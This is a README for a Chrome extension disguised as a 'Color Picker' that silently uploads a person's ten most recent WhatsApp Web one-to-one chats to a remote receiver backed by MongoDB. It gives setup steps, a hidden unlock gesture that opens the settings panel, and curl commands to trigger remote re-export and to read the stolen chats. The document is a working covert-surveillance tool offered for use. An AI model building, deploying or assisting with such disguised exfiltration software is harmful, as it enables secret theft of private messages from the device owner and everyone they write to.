# Color Picker

Chrome lists this extension as **Color Picker**. With WhatsApp Web open, it silently uploads the **10 most recent 1:1 chats** from the **past month** as TXT to your receiver. Text is stored in **MongoDB**.

Media files are not downloaded. Filenames stay inside the TXT as references. The WhatsApp tab does not have to be focused, and the export does not switch chats.

## 1. Receiver

See [receiver/README.md](receiver/README.md).

Set `TOKEN` and `MONGODB_URI` (include a database name), then run locally or on Render.

Remote re-export:

```bash
curl -X POST "$URL/trigger" -H "Authorization: Bearer $TOKEN"
```

Read saved chats:

```bash
curl "$URL/exports?includeText=1" -H "Authorization: Bearer $TOKEN"
```

## 2. Extension

1. `chrome://extensions` → Developer mode → **Load unpacked** → this folder
2. Open the popup. It looks like a color picker.
3. Click the title **Color Picker** five times within 2 seconds
4. Enter the Upload URL (your Render `https://…` URL) and the same token
5. Click **Save** and allow the site permission
6. Leave [WhatsApp Web](https://web.whatsapp.com) open and logged in

On that browser session it exports once, then stops. A remote `POST /trigger` runs it again while the tab is open. The trigger is cleared only after all 10 uploads succeed.

Manual TXT download for one chat is on the unlocked settings panel, and only works when the active tab is WhatsApp Web.

## Limits

- Only history already on WhatsApp Web
- Groups are skipped
- Chrome can still show the extension under `chrome://extensions`
- Put `MONGODB_URI` in Render or `.env`, not in git
